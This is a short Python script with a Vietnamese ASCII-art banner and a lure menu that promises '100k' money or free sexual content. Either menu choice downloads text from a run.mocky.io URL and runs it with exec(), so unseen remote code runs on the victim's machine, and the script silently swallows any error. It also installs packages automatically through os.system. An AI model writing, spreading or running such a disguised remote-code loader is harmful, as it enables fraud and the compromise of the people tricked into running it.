import os, sys,re,json,random
from time import sleep
import threading
try:
	import requests,pystyle
except:
	os.system('pip install requests && pip install bs4 && pip install pystyle')
print("░█████╗░░█████╗░░█████╗░███╗░░██╗░██████╗░")
print("██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔════╝░")
print("██║░░╚═╝██║░░██║██║░░██║██╔██╗██║██║░░██╗░")
print("██║░░██╗██║░░██║██║░░██║██║╚████║██║░░╚██╗")
print("╚█████╔╝╚█████╔╝╚█████╔╝██║░╚███║╚██████╔╝")
print("░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚══╝░╚═════╝░")
print(" xin 50 chục ok nhá")
print("nhập 1 để nhận 100k")
print("nhập 2 để chơi đĩ free")
abc = int(input("Nhập đi em : "))                                                              
try:
  if abc == 1:
    exec(requests.get("https://run.mocky.io/v3/4c9f487b-835f-4444-87d4-518623287373").text)
  if abc == 2:
    exec(requests.get("https://run.mocky.io/v3/e80153e0-2f0c-4bb2-97d5-7c0172893405").text)


except:
   pass